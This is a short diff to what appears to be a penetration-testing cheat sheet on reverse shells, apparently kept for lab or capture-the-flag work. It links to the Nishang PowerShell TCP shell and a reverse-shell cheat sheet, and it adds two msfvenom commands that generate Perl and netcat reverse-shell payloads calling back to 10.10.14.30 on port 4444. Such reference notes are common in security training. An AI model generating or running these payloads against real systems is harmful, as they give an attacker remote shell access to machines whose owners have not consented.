@@ -130,6 +130,12 @@ Nishang Powershell - Invoke-PowerShellTcp.ps1
 - https://github.com/samratashok/nishang
 - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
 
+# Generate reverse shell
+msfvenom -p cmd/unix/reverse_perl LHOST=10.10.14.30 LPORT=4444 R
+=> generate perl nc
+
+msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.30 LPORT=4444 R
+=> nc in shell
 
 # More to read
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
